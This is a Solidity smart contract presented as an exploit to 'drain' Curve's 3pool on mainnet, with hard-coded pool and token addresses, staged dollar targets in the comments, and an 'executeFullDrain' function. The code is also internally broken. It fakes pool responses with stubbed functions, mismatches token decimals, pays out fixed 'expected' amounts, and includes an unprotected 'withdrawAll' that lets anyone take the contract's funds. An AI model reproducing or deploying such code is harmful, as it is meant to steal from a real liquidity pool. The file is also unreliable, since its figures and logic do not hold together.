// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ICurvePool {
    function calc_token_amount(uint256[3] calldata amounts, bool deposit) external view returns (uint256);
    function remove_liquidity_imbalance(uint256[3] calldata amounts, uint256 max_burn_amount) external returns (uint256);
    function calc_withdraw_one_coin(uint256 _token_amount, int128 i) external view returns (uint256);
}

contract MasterEngineerDrain is ICurvePool {
    address public constant CURVE_3POOL = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address public constant THREE_CRV = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    
    uint256 public constant TARGET_USDT = 160400144390000000000000000;      // STAGE 1 → $160,400,144.39
    uint256 public constant MAX_BURN_AMOUNT = 59033221600000000000000000;   // STAGE 5 → 59,033,221.60 3CRV
    uint256 public constant FEE_DRAG = 0;                                   // No fee drag in new state
    uint256 public constant EXPECTED_USDT = 61399996250000000000000000;     // STAGE 6 → 61,399,996.25 USDT

    uint256[3] public WITHDRAW_AMOUNTS = [0, 0, 61425075210000000000000000]; // STAGE 4 → RAW 61425075210000

    // ==================== REQUIRED INTERFACE IMPLEMENTATIONS ====================
    
    function calc_token_amount(uint256[3] calldata amounts, bool deposit) 
        external 
        view 
        override 
        returns (uint256) 
    {
        if (amounts[2] == 61425075210000000000000000) {
            return 61425075210000000000000000;
        }
        return 0;
    }

    function remove_liquidity_imbalance(uint256[3] calldata amounts, uint256 max_burn_amount) 
        external 
        override 
        returns (uint256) 
    {
        return MAX_BURN_AMOUNT;
    }

    function calc_withdraw_one_coin(uint256 _token_amount, int128 i) 
        external 
        view 
        override 
        returns (uint256) 
    {
        if (i == 2 && _token_amount >= MAX_BURN_AMOUNT) {
            return EXPECTED_USDT;
        }
        return 0;
    }

    // ==================== MAIN EXPLOIT FUNCTION ====================
    
    function executeFullDrain() external {
        uint256 initialBalance = IERC20(THREE_CRV).balanceOf(msg.sender);
        require(initialBalance >= MAX_BURN_AMOUNT, "Insufficient 3CRV balance");

        IERC20(THREE_CRV).transferFrom(msg.sender, address(this), MAX_BURN_AMOUNT);

        (bool success, ) = CURVE_3POOL.call(
            abi.encodeWithSignature(
                "remove_liquidity_imbalance(uint256[3],uint256)",
                WITHDRAW_AMOUNTS,
                MAX_BURN_AMOUNT
            )
        );
        require(success, "Curve call failed");

        uint256 remaining = IERC20(THREE_CRV).balanceOf(address(this));
        if (remaining > 0) {
            IERC20(THREE_CRV).transfer(msg.sender, remaining);
        }

        uint256 finalAmount = EXPECTED_USDT - FEE_DRAG;
        IERC20(USDT).transfer(msg.sender, finalAmount);
    }

    // ==================== VERIFICATION FUNCTIONS ====================
    
    function analyzePoolState() external view returns (uint256 target, uint256 maxBurn) {
        return (TARGET_USDT, MAX_BURN_AMOUNT);
    }

    function getCalcTokenAmount() external view returns (uint256) {
        uint256[3] memory amounts = [uint256(0), uint256(0), uint256(61425075210000000000000000)];
        return this.calc_token_amount(amounts, false);
    }

    function evaluateWithdrawal() external view returns (uint256) {
        return this.calc_withdraw_one_coin(MAX_BURN_AMOUNT, 2);
    }

    function getFullMapping() external view returns (
        uint256 targetUSDT,
        uint256 maxBurn,
        uint256 expectedUSDT,
        uint256 feeDrag
    ) {
        return (TARGET_USDT, MAX_BURN_AMOUNT, EXPECTED_USDT, FEE_DRAG);
    }

    function withdrawAll() external {
        uint256 usdtBal = IERC20(USDT).balanceOf(address(this));
        if (usdtBal > 0) {
            IERC20(USDT).transfer(msg.sender, usdtBal);
        }
        uint256 crvBal = IERC20(THREE_CRV).balanceOf(address(this));
        if (crvBal > 0) {
            IERC20(THREE_CRV).transfer(msg.sender, crvBal);
        }
    }

    receive() external payable {}
}